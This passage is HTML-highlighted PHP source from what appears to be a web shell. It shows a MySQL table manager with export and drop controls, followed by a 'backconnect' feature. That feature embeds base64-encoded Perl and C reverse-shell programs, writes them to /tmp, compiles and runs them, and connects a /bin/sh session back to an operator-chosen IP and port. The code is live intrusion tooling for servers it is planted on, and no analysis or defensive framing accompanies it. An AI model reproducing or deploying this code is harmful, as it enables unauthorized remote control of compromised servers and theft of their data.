<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Rows'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Data_length'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Create_time'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Update_time'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">highver</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Engine'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Collation'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Name'</span>].<span style="color: #ad7fa8; font-style: italic;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Name'</span>].<span style="color: #ad7fa8; font-style: italic;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Name'</span>].<span style="color: #ad7fa8; font-style: italic;">'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">highver</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class='</span>.<span style="color: #eeeeec; background-color: #2e3436;">bg(</span>).<span style="color: #ad7fa8; font-style: italic;">'&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Total tables: '</span>.$<span style="color: #eeeeec;">table_num</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">table_rows</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">data_size</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td colspan="'</span>.($<span style="color: #eeeeec;">highver</span> ? <span style="color: #eeeeec; background-color: #2e3436;">5</span> : <span style="color: #eeeeec; background-color: #2e3436;">3</span>).<span style="color: #ad7fa8; font-style: italic;">'"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;tr class=\""</span>.<span style="color: #eeeeec; background-color: #2e3436;">bg(</span>).<span style="color: #ad7fa8; font-style: italic;">"\"&gt;&lt;td colspan=\""</span>.($<span style="color: #eeeeec;">highver</span> ? <span style="color: #eeeeec; background-color: #2e3436;">9</span> : <span style="color: #eeeeec; background-color: #2e3436;">7</span>).<span style="color: #ad7fa8; font-style: italic;">"\"&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\""</span>.<span style="color: #f57900; font-weight: bold;">SA_ROOT</span>.$<span style="color: #eeeeec;">dbname</span>.<span style="color: #ad7fa8; font-style: italic;">".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'doing'</span>,<span style="color: #ad7fa8; font-style: italic;">'backupmysql'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;/table&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fr(</span>$<span style="color: #eeeeec;">query</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">tbfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">mysql_close(</span>);
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end mysql</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'backconnect'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">yourip</span> &amp;&amp; $<span style="color: #eeeeec;">yourip</span> = $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'REMOTE_ADDR'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">yourport</span> &amp;&amp; $<span style="color: #eeeeec;">yourport</span> = <span style="color: #ad7fa8; font-style: italic;">'12345'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">usedb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'perl'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'perl'</span>,<span style="color: #ad7fa8; font-style: italic;">'c'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'c'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">back_connect</span>=<span style="color: #ad7fa8; font-style: italic;">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">back_connect_c</span>=<span style="color: #ad7fa8; font-style: italic;">"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp"</span>.
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #ad7fa8; font-style: italic;">"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=="</span>;

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">start</span> &amp;&amp; $<span style="color: #eeeeec;">yourip</span> &amp;&amp; $<span style="color: #eeeeec;">yourport</span> &amp;&amp; $<span style="color: #eeeeec;">use</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">use</span> == <span style="color: #ad7fa8; font-style: italic;">'perl'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">cf(</span><span style="color: #ad7fa8; font-style: italic;">'/tmp/angel_bc'</span>,$<span style="color: #eeeeec;">back_connect</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = <span style="color: #eeeeec; background-color: #2e3436;">execute(which(</span><span style="color: #ad7fa8; font-style: italic;">'perl'</span>).<span style="color: #ad7fa8; font-style: italic;">" /tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">cf(</span><span style="color: #ad7fa8; font-style: italic;">'/tmp/angel_bc.c'</span>,$<span style="color: #eeeeec;">back_connect_c</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = <span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">'gcc -o /tmp/angel_bc /tmp/angel_bc.c'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">unlink(</span><span style="color: #ad7fa8; font-style: italic;">'/tmp/angel_bc.c'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = <span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">"/tmp/angel_bc $yourip $yourport &amp;"</span>);
